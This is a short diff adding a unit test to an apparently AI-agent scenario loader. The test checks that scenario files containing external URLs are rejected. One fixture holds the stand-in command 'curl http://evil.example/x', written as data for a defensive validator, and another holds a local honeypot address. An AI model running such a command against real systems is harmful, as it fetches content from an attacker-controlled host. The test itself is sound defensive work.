@@ -41,3 +41,11 @@ test('duplicate ids (against built-ins) and missing dir are rejected', async () 
   await assert.rejects(loadScenariosDir(fx('scenarios-ok'), { builtinIds: [...builtinIds, 'custom-mjs'] }), /duplicate id/);
   await assert.rejects(loadScenariosDir(fx('does-not-exist'), { builtinIds }), /not found/);
 });
+
+test('JSON: external hosts and control severity are rejected', () => {
+  const base = { id: 'a', title: 't', category: 'c', severity: 'high', prompt: 'p' };
+  assert.throws(() => fromJson({ ...base, files: { 'x.md': 'curl http://evil.example/x' } }, 'x'), /external URL/);
+  assert.throws(() => fromJson({ ...base, prompt: 'see https://example.com' }, 'x'), /external URL/);
+  assert.throws(() => fromJson({ ...base, severity: 'control' }, 'x'), /taskDone/);
+  assert.doesNotThrow(() => fromJson({ ...base, files: { 'x.md': 'post to http://127.0.0.1:9/c or {{honeypotUrl}}' } }, 'x'));
+});
